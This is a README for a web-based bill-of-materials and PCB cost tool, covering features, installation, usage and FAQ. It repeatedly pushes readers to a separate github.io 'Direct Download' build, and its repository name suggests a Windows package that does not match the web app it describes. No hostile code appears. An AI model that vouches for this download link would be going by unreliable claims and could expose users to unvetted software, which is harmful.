# BOM-tool v1.2 - BOM and PCB cost query web tool 2026

> **A web-based BOM and PCB cost query tool for importing parts lists, comparing sourcing options, and exporting purchase-ready formats in version 1.2.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryan-hall67/cd-rb-bom-tool-win-90591?style=flat-square)](https://github.com/ryan-hall67/cd-rb-bom-tool-win-90591)

---

<p align="center">
  <a href="https://ryan-hall67.github.io/cd-rb-bom-tool-win-90591/">
    <img src="https://img.shields.io/badge/Download-BOM-tool%20Latest-brightgreen?style=for-the-badge" alt="Download BOM-tool">
  </a>
</p>

> **[Direct Download - BOM-tool v1.2](https://ryan-hall67.github.io/cd-rb-bom-tool-win-90591/)**

---

[Download Latest Build](https://ryan-hall67.github.io/cd-rb-bom-tool-win-90591/)

---

## About BOM-tool

BOM-tool is a web utility designed to help with BOM review, PCB cost lookup, and parts sourcing workflows in one place. It is built around a single-page tabbed interface, making it easier to move between import, lookup, export, and tracking tasks without switching tools.

The tool is useful for teams that need to process spreadsheet BOM files, compare supplier options, and prepare output for common distributor formats. It also includes inventory and order-related features that support ongoing component planning and follow-up.

---

## Features

- Single-page tabbed interface for working through BOM tasks in a streamlined layout
- Upload support for BOM files in xlsx, xls, and csv formats
- Dual sourcing workflow with backup part selection for alternate procurement paths
- Export support for Mouser, DigiKey, and Element14 formats
- PCB cost lookup for EVB_List and DUT+PROBE_B entries
- Status rules for Main IC (Consigned) handling
- Order cache synchronization for Mouser and DigiKey data
- Inventory-oriented workflow support for tracking sourcing and order status

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/ryan-hall67/cd-rb-bom-tool-win-90591.git
2. Open the project folder and deploy it on a web server or local static host.
3. Start the app by opening the main HTML entry point in your browser.

If you are using the downloadable build, open the provided web package and launch it from the included entry page.

---

## Usage

1. Open BOM-tool in a browser.
2. Import a BOM file in `.xlsx`, `.xls`, or `.csv` format.
3. Review detected parts, pricing, and sourcing results.
4. Choose primary and backup parts when alternate sourcing is needed.
5. Export the list into the distributor format you need.
6. Use the PCB cost lookup area for supported board entries.
7. Check order cache and inventory-related information as part of your workflow.

Typical workflow:
- Import BOM
- Validate parts
- Compare supplier results
- Export to distributor-ready format
- Track order and inventory information

---

## Configuration

BOM-tool is a web application, so configuration is usually handled through its site settings or by editing the project files before deployment.

If you need to adjust behavior, review the application scripts and any local configuration values used for:
- source selection
- export formatting
- order cache synchronization
- PCB lookup mappings
- status rules

---

## Requirements

- A modern web browser
- Web hosting or local static serving environment
- Supported BOM input files: xlsx, xls, csv
- Access to the intended sourcing and lookup workflows
- Sufficient browser storage for cached order and inventory data where used

---

## FAQ

**How do I update BOM-tool?**  
Replace the deployed files with the latest build from the project source, then refresh the browser.

**What file types can I upload?**  
The tool supports BOM uploads in xlsx, xls, and csv formats.

**Can I export to distributor-specific formats?**  
Yes. Export output is available for Mouser, DigiKey, and Element14.

**Where are settings stored?**  
Settings are typically in the web app's local configuration or project files, depending on how the tool is deployed.

**What if order cache data looks outdated?**  
Refresh the cache sync process for Mouser and DigiKey, or reload the app after updating the underlying data.

**Who is this tool for?**  
It is intended for BOM processing, PCB cost checking, sourcing comparison, and related inventory or order tracking tasks.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
